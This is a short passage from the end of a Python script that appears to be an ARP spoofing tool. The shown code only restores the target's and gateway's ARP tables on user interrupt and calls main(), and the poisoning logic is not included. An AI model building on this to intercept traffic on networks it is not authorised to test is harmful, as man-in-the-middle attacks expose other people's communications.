            print(Fore.RED + "\n[*] Exiting on user interrupt.")
            reset_operation(target_ip, gateway_ip)
            reset_operation(gateway_ip, target_ip)
            print(Fore.GREEN + "[*] ARP tables reset successfully.")

if __name__ == "__main__":
    main()

